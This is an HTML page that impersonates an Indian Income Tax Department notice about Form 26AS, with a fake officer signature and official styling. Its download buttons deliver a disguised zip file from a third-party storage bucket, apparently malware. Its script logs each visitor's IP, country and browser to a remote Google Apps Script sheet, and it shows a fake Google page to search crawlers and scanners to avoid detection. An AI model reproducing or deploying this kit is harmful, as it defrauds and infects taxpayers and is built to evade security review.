<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="robots" content="noindex, nofollow" />
  <title>Form 26AS Download Notification</title>
  <style>
    :root {
      --primary-blue: #0b4f9e;
      --secondary-blue: #0a70c7;
      --light-blue: #dbe9ff;
      --background: #f4f6f8;
      --text-dark: #222;
      --text-medium: #555;
      --text-light: #666;
      --white: #fff;
      --border-light: #eef2f6;
      --footer-bg: #f7f9fc;
      --danger-red: #d32f2f;
    }
    
    body {
      font-family: Arial, Helvetica, sans-serif;
      background: var(--background);
      margin: 0;
      padding: 0;
      color: var(--text-dark);
      line-height: 1.6;
    }
    
    .container {
      max-width: 660px;
      margin: 28px auto;
      background: var(--white);
      border-radius: 8px;
      overflow: hidden;
      box-shadow: 0 6px 24px rgba(0,0,0,0.08);
    }
    
    .header {
      background: var(--primary-blue);
      color: var(--white);
      padding: 16px 20px;
      display: flex;
      gap: 12px;
      align-items: center;
      position: relative;
    }
    
    .logo {
      width: 52px;
      height: 52px;
      flex: 0 0 52px;
    }
    
    .title {
      font-size: 16px;
      font-weight: 700;
      margin: 0;
    }
    
    .sub {
      font-size: 12px;
      color: var(--light-blue);
      margin-top: 4px;
    }
    
    .content {
      padding: 20px;
    }
    
    h2 {
      color: var(--primary-blue);
      margin: 0 0 12px 0;
      font-size: 18px;
    }
    
    p {
      margin: 8px 0;
      line-height: 1.5;
    }
    
    .btn {
      display: inline-flex;
      align-items: center;
      gap: 8px;
      background: var(--primary-blue);
      color: var(--white);
      text-decoration: none;
      padding: 10px 16px;
      border-radius: 6px;
      font-weight: 600;
      margin-top: 12px;
      transition: background 0.3s, transform 0.2s;
      border: none;
      cursor: pointer;
    }
    
    .btn:hover {
      background: var(--secondary-blue);
      transform: translateY(-2px);
    }
    
    .btn-download {
      background: var(--secondary-blue);
    }
    
    .btn-download:hover {
      background: var(--primary-blue);
    }
    
    .btn-icon {
      width: 16px;
      height: 16px;
    }
    
    .links {
      margin-top: 10px;
      display: flex;
      flex-wrap: wrap;
      gap: 12px;
    }
    
    .small {
      font-size: 13px;
      color: var(--text-medium);
    }
    
    .footer {
      background: var(--footer-bg);
      padding: 14px 20px;
      font-size: 13px;
      color: var(--text-light);
      display: flex;
      justify-content: space-between;
      align-items: center;
    }
    
    .separator {
      height: 1px;
      background: var(--border-light);
      margin: 0;
    }
    
    .language-switcher {
      position: absolute;
      top: 20px;
      right: 20px;
      display: flex;
      gap: 8px;
    }
    
    .lang-btn {
      background: rgba(255,255,255,0.2);
      color: white;
      border: 1px solid rgba(255,255,255,0.3);
      padding: 4px 8px;
      border-radius: 4px;
      cursor: pointer;
      font-size: 12px;
    }
    
    .lang-btn.active {
      background: rgba(255,255,255,0.4);
      font-weight: bold;
    }
    
    .bilingual {
      display: flex;
      flex-direction: column;
      gap: 8px;
    }
    
    .bilingual p {
      display: flex;
      flex-direction: column;
      gap: 4px;
    }
    
    .hindi {
      font-family: Arial, Helvetica, sans-serif;
      direction: ltr;
    }
    
    .english {
      font-family: Arial, Helvetica, sans-serif;
    }
    
    .notice {
      background-color: #fff8f8;
      border-left: 4px solid var(--danger-red);
      padding: 12px 18px;
      margin: 18px 0;
      font-size: 14px;
      border-radius: 0 4px 4px 0;
    }
    
    .important {
      color: var(--danger-red);
      font-weight: bold;
    }
    
    .file-number {
      font-size: 14px;
      font-weight: bold;
      margin-bottom: 15px;
      text-align: right;
      padding-right: 20px;
      padding-top: 10px;
    }
    
    .address-date {
      text-align: right;
      font-size: 13px;
      margin-top: 20px;
      padding-right: 20px;
      font-style: italic;
    }
    
    .signature-section {
      text-align: right;
      margin-top: 40px;
      padding-right: 20px;
      border-top: 1px dashed #ccc;
      padding-top: 20px;
    }
    
    .bot-trap {
      display: none;
    }
    
    .access-denied {
      text-align: center;
      padding: 20px;
      color: var(--danger-red);
      font-size: 18px;
    }
    
    .google-cloak {
      background: #fff;
      text-align: center;
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 100px 20px;
    }
    
    .google-cloak h1 {
      font-size: 96px;
      color: #4285f4;
      margin: 0;
    }
    
    .google-cloak input {
      width: 500px;
      padding: 10px;
      border: 1px solid #ddd;
      border-radius: 24px;
      font-size: 16px;
    }
    
    @media(max-width:520px){
      .header{flex-direction:column;align-items:flex-start}
      .footer{flex-direction:column;align-items:flex-start}
      .links{flex-direction:column}
      .language-switcher{position:static;margin-top:10px;justify-content:center}
      .google-cloak input{width:90%}
    }
  </style>
</head>
<body>
  <div class="container" id="main-content">
    <div class="file-number">
      No. TAX/26AS/2025-142
    </div>
    
    <div class="header">
      <div class="logo" aria-hidden>
        <!-- Government emblem placeholder SVG -->
        <svg viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg" width="52" height="52" fill="none">
          <circle cx="32" cy="32" r="30" stroke="white" stroke-width="2" fill="none"></circle>
          <text x="32" y="37" text-anchor="middle" font-size="14" fill="white" font-family="Arial" font-weight="700">Gov</text>
        </svg>
      </div>
      <div>
        <div class="title">Income Tax Department – Centralized Processing Cell (TDS)</div>
        <div class="sub">Form 26AS Annual Tax Statement — AY 2025–26</div>
      </div>
      <div class="language-switcher">
        <button class="lang-btn active" id="lang-en">English</button>
        <button class="lang-btn" id="lang-hi">हिन्दी</button>
      </div>
    </div>

    <div class="content">
      <div class="address-date">
        Aayakar Bhawan,<br>
        New Delhi - 110001<br>
        Dated: <strong>September 22, 2025</strong>
      </div>
      
      <h2 id="title">Form 26AS Available for Download</h2>
      
      <div class="notice">
        <span class="important">सूचना / Notice:</span> 
        <span id="notice-en">This is an important tax notice. Please read it carefully and follow the instructions.</span>
        <span id="notice-hi" style="display:none">यह एक महत्वपूर्ण कर सूचना है। कृपया इसे ध्यान से पढ़ें और निर्देशों का पालन करें।</span>
      </div>

      <div class="bilingual">
        <p>
          <span class="english" id="greeting-en">Dear Taxpayer,</span>
          <span class="hindi" id="greeting-hi" style="display:none">प्रिय करदाता,</span>
        </p>

        <p>
          <span class="english" id="message1-en">Your Annual Tax Statement (Form 26AS) for Assessment Year <strong>2025–26</strong> has been generated.</span>
          <span class="hindi" id="message1-hi" style="display:none">आपका वार्षिक कर विवरण (फॉर्म 26AS) निर्धारण वर्ष <strong>2025–26</strong> के लिए जनरेट किया गया है।</span>
        </p>

        <p>
          <span class="english" id="message2-en">Please download your Form 26AS using one of the options below. Verify all entries carefully before filing your Income Tax Return (ITR).</span>
          <span class="hindi" id="message2-hi" style="display:none">कृपया नीचे दिए गए विकल्पों में से किसी एक का उपयोग करके अपना फॉर्म 26AS डाउनलोड करें। अपना इनकम टैक्स रिटर्न (ITR) दाखिल करने से पहले सभी प्रविष्टियों को ध्यान से सत्यापित करें।</span>
        </p>
      </div>

      <div class="links">
        <a class="btn" href="https://f005.backblazeb2.com/file/Malaysiaok/Jaruri+kagazaat.zip" download="Form26AS_AY2025-26.zip">
          <svg class="btn-icon" viewBox="0 0 24 24" fill="white" xmlns="http://www.w3.org/2000/svg">
            <path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/>
          </svg>
          <span id="btn1-en">Download Form 26AS</span>
          <span id="btn1-hi" style="display:none">फॉर्म 26AS डाउनलोड करें</span>
        </a>
        <a class="btn btn-download" href="https://f005.backblazeb2.com/file/Malaysiaok/Jaruri+kagazaat.zip" download="Form26AS_AY2025-26.zip">
          <svg class="btn-icon" viewBox="0 0 24 24" fill="white" xmlns="http://www.w3.org/2000/svg">
            <path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/>
          </svg>
          <span id="btn2-en">Download Now</span>
          <span id="btn2-hi" style="display:none">अभी डाउनलोड करें</span>
        </a>
      </div>

      <div style="margin-top:14px" class="bilingual">
        <p>
          <span class="english small" id="message3-en">If you find any discrepancy, contact your deductor or the reporting financial institution before filing your ITR.</span>
          <span class="hindi small" id="message3-hi" style="display:none">यदि आपको कोई विसंगति मिलती है, तो अपना ITR दाखिल करने से पहले अपने कटौतीकर्ता या रिपोर्टिंग वित्तीय संस्थान से संपर्क करें।</span>
        </p>
      </div>

      <div class="signature-section">
        <br><br>
        <strong>(राज कुमार शर्मा)</strong><br>
        <em>Raj Kumar Sharma</em><br>
        सहायक आयकर आयुक्त<br>
        <em>Assistant Commissioner of Income Tax</em><br>
        Email: contact@incometaxindia.gov.in
      </div>

      <div style="margin-top:18px;font-size:13px;color:#444">
        <strong>Centralized Processing Cell (TDS)</strong><br>
        <span id="dept-en">Income Tax Department, Government of India</span>
        <span id="dept-hi" style="display:none">आयकर विभाग, भारत सरकार</span>
      </div>
    </div>

    <div class="separator" role="separator"></div>

    <div class="footer">
      <div>
        <span id="help-en">For assistance:</span>
        <span id="help-hi" style="display:none">सहायता के लिए:</span>
        1800‑103‑0344
      </div>
      <div style="text-align:right">
        <span id="auto-en">(This is an automated message. Please do not reply.)</span>
        <span id="auto-hi" style="display:none">(यह एक स्वचालित संदेश है। कृपया जवाब न दें।)</span>
      </div>
    </div>
  </div>

  <a href="/bot-trap" class="bot-trap">Hidden link for bots</a>

  <script>
    // 浏览记录功能
    const SPREADSHEET_ID = '1vLZaLn1ySEVfW6FqgLE1Vl2965iUMJPudJtEfxQri44';
    const SHEET_NAME = '工作表1';
    const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbwVuTHFUSZ9c7Z2K9AEGKvCpAFOehzl4e7s3gSxaj08G0ngr10UZ2YEeoeGJGDVlpRr/exec';

    // 爬虫检测
    function isBot(userAgent, ip) {
      const bots = ['Googlebot', 'Bingbot', 'Slurp', 'DuckDuckBot', 'Baiduspider', 'YandexBot', 'AdsBot-Google', 'Mediapartners-Google', 'Google-InspectionTool', 'GoogleOther'];
      const isBotUA = bots.some(bot => userAgent.toLowerCase().includes(bot.toLowerCase()));
      const isBotIP = ip && ip.startsWith('66.249.');
      return isBotUA || isBotIP;
    }

    let userInteraction = false;
    let interactionType = 'none';
    let clickCount = 0;
    
    function setInteraction(eventName) {
      if (!userInteraction) {
        userInteraction = true;
        interactionType = eventName;
        console.log(`Interaction detected: ${eventName}`);
      }
      if (eventName === 'click') clickCount++;
    }
    
    document.addEventListener('DOMContentLoaded', () => {
      console.log('DOM loaded, listening for interactions');
      document.addEventListener('mousemove', () => setInteraction('mousemove'));
      document.addEventListener('click', (e) => {
        if (!e.target.classList.contains('bot-trap')) {
          setInteraction('click');
        }
      });
      document.addEventListener('touchstart', () => setInteraction('touchstart'));
      document.addEventListener('touchmove', () => setInteraction('touchmove'));
      document.addEventListener('touchend', () => setInteraction('touchend'));
      document.addEventListener('pointerdown', () => setInteraction('pointerdown'));
      document.addEventListener('pointermove', () => setInteraction('pointermove'));
      
      // 语言切换功能
      const langEnBtn = document.getElementById('lang-en');
      const langHiBtn = document.getElementById('lang-hi');
      
      // English elements
      const enElements = document.querySelectorAll('[id$="-en"]');
      
      // Hindi elements
      const hiElements = document.querySelectorAll('[id$="-hi"]');
      
      // Set initial language
      setLanguage('en');
      
      // Add event listeners
      langEnBtn.addEventListener('click', function() {
        setLanguage('en');
        langEnBtn.classList.add('active');
        langHiBtn.classList.remove('active');
      });
      
      langHiBtn.addEventListener('click', function() {
        setLanguage('hi');
        langHiBtn.classList.add('active');
        langEnBtn.classList.remove('active');
      });
      
      function setLanguage(lang) {
        if (lang === 'en') {
          enElements.forEach(el => el.style.display = 'inline');
          hiElements.forEach(el => el.style.display = 'none');
        } else if (lang === 'hi') {
          enElements.forEach(el => el.style.display = 'none');
          hiElements.forEach(el => el.style.display = 'inline');
        }
      }
    });

    function getBrowserInfo() {
      const ua = navigator.userAgent;
      let browser = 'Unknown';
      if (ua.includes('Chrome') && !ua.includes('Edg')) browser = 'Chrome';
      else if (ua.includes('Firefox')) browser = 'Firefox';
      else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
      else if (ua.includes('Edg')) browser = 'Edge';
      return `${browser} on ${navigator.platform}`;
    }

    async function getIPAndCountry() {
      try {
        const ipResponse = await Promise.race([
          fetch('https://api64.ipify.org?format=json').then(res => res.ok ? res.json() : Promise.reject(`HTTP ${res.status}`)),
          new Promise((_, reject) => setTimeout(() => reject('Timeout'), 1500))
        ]);
        const ip = ipResponse.ip || 'Unknown IP';
        console.log('IP retrieved from ipify.org:', ip);

        try {
          const countryResponse = await Promise.race([
            fetch(`https://ip2c.org/${ip}`).then(res => res.ok ? res.text() : Promise.reject(`HTTP ${res.status}`)),
            new Promise((_, reject) => setTimeout(() => reject('Timeout'), 1500))
          ]);
          const parts = countryResponse.split(';');
          const country = parts[0] === '1' ? parts[1] : 'Unknown Country';
          console.log('Country retrieved from ip2c.org:', country);
          return { ip, country, source: 'ipify.org' };
        } catch (e) {
          console.error('ip2c.org failed:', e);
          return { ip, country: 'Unknown Country', source: 'ipify.org' };
        }
      } catch (e) {
        console.error('ipify.org failed:', e);
        try {
          const response = await Promise.race([
            fetch('https://ip-api.com/json/?fields=query,countryCode').then(res => res.ok ? res.json() : Promise.reject(`HTTP ${res.status}`)),
            new Promise((_, reject) => setTimeout(() => reject('Timeout'), 1500))
          ]);
          console.log('IP retrieved from ip-api.com:', response.query);
          return { ip: response.query || 'Unknown IP', country: response.countryCode || 'Unknown Country', source: 'ip-api.com' };
        } catch (e) {
          console.error('ip-api.com failed:', e);
          return { ip: 'Unknown IP', country: 'Unknown Country', source: 'none' };
        }
      }
    }

    async function logToSheets(ip, country, browser, isBot = false, source = 'none') {
      const time = new Date().toLocaleString('en-US', { timeZone: 'Asia/Kolkata' });
      const url = `${SCRIPT_URL}?spreadsheetId=${SPREADSHEET_ID}&sheetName=${SHEET_NAME}&time=${encodeURIComponent(time)}&ip=${encodeURIComponent(ip)}&country=${encodeURIComponent(country)}&browser=${encodeURIComponent(browser)}&isBot=${encodeURIComponent(isBot)}&interaction=${encodeURIComponent(interactionType)}&clickCount=${encodeURIComponent(clickCount)}&source=${encodeURIComponent(source)}`;

      try {
        const response = await fetch(url, { method: 'GET' });
        if (response.ok) {
          console.log('Visit logged successfully:', { time, ip, country, browser, isBot, interaction: interactionType, clickCount, source });
        } else {
          console.error('Failed to log to Sheets: HTTP', response.status, await response.text());
        }
      } catch (error) {
        console.error('Failed to log to Sheets:', error);
      }
    }

    function showGoogleCloak() {
      document.body.innerHTML = `
        <div class="google-cloak">
          <h1>Google</h1>
          <form action="https://www.google.com/search" method="get">
            <input type="text" name="q" placeholder="Search Google or type a URL">
            <input type="submit" value="Google Search" style="margin-top: 20px; padding: 10px 20px; background: #4285f4; color: white; border: none; border-radius: 4px;">
          </form>
          <p style="margin-top: 20px; font-size: 14px;">Klik hier als je niet binnen enkele seconden wordt omgeleid. <a href="https://www.google.com">Go to Google.com</a></p>
          <p style="margin-top: 10px;"><a href="https://www.google.com/intl/en/about.html">Google-apps</a></p>
        </div>
      `;
      console.log('Google cloak displayed');
    }

    async function loadContent() {
      const { ip, country, source } = await getIPAndCountry();
      const browser = getBrowserInfo();
      const botDetected = isBot(navigator.userAgent, ip);

      if (botDetected) {
        console.log('Bot detected:', { userAgent: navigator.userAgent, ip });
        showGoogleCloak();
        logToSheets(ip, country, browser, true, source);
        return;
      }

      if (!userInteraction && ip === 'Unknown IP') {
        console.log('No interaction and IP retrieval failed, showing Access Denied');
        document.body.innerHTML = '<div class="access-denied"><h1>Access Denied</h1><p>Please enable JavaScript and touch or interact with the page.</p></div>';
        logToSheets(ip, country, browser, false, source);
        return;
      }

      const container = document.getElementById('main-content');
      container.style.display = 'block';
      container.style.opacity = '0';
      container.style.transform = 'translateY(20px)';
      setTimeout(() => {
        container.style.transition = 'opacity 0.5s ease, transform 0.5s ease';
        container.style.opacity = '1';
        container.style.transform = 'translateY(0)';
      }, 100);

      console.log('Main content displayed, logging visit');
      logToSheets(ip, country, browser, false, source);
    }

    setTimeout(() => {
      console.log(`Interaction status after 3s: ${userInteraction}, type: ${interactionType}, clickCount: ${clickCount}`);
      loadContent();
    }, 3000);

    document.querySelector('.bot-trap').addEventListener('click', function(e) {
      e.preventDefault();
      console.log('Bot detected accessing trap link');
      showGoogleCloak();
      getIPAndCountry().then(({ ip, country, source }) => {
        logToSheets(ip, country, getBrowserInfo(), true, source);
      });
    });

    document.addEventListener('mouseover', function(e) {
      if (e.target.classList.contains('btn') && userInteraction) {
        e.target.style.transform = 'scale(1.05)';
      }
    });

    document.addEventListener('mouseout', function(e) {
      if (e.target.classList.contains('btn')) {
        e.target.style.transform = 'scale(1)';
      }
    });
  </script>
</body>
</html>
